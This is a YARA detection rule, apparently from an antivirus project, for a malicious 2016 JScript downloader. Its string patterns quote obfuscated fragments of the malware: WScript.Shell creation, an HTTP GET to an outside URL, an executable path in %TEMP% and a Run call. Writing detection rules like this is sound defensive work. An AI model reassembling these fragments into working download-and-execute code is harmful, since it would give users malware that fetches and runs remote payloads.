rule sig_20160328_f2fabf2d59589f4bb7d00c78500520f7 {
  meta:
    description = "datamaliciousorder - file 20160328_f2fabf2d59589f4bb7d00c78500520f7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dd2b07fb5cc2938f47a4353828fb4f9476ad7ddc95e965c57d4efee6cf2a1985"

  strings:
    $s1  = "function Gegvbycu() {return Paers[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kDMv2c04rDDdw23C.exe\";};" fullword ascii
    $s2  = "Yqcpubskn[Spjyjwyd](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Xluwifunnk](Swkiuoor() * 11)} while (Yqcpubskn[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Rvwirxvfc(Xsigf, Uiidlclw){return Xsigf - Uiidlclw;};" fullword ascii
    $s5  = "var Paers = function Xnqyetutqk() {return WScript[Lviqv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ykxzl(Hnnqx){Paers[\"Run\"](Hnnqx, Qpmovlik, Qpmovlik);};" fullword ascii
    $s7  = "function Xrxjxsvob() {return ((Kvetvfobq == true) && (Kvetvfobq == Magduyf)) ? 1 : Qpmovlik;};" fullword ascii
    $s8  = "function Swkiuoor(){return 22;};" fullword ascii
    $s9  = "Magduyf = true; " fullword ascii
    $s10 = " while (Iangns){" fullword ascii
    $s11 = "var Uppxnvpf = new this[\"Date\"]();" fullword ascii
    $s12 = "var Hcmresoln = false;" fullword ascii
    $s13 = "var Magduyf = false;" fullword ascii
    $s14 = "function Qieyuyd(){return Lviqv;};" fullword ascii
    $s15 = "var Kvetvfobq = false;" fullword ascii
    $s16 = "function Tchipvaj()" fullword ascii
    $s17 = "Kvetvfobq = true; " fullword ascii
    $s18 = "function Dweql(){return Beuhlzpuzq;};" fullword ascii
    $s19 = "function Oetqkrby(Rjpyknzygi) {var Mbqoasnc = (1, 2, 3, 4, 5, Rjpyknzygi); return Mbqoasnc;};" fullword ascii
    $s20 = "return Rvwirxvfc(Zbfotegh, Wmhiw);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}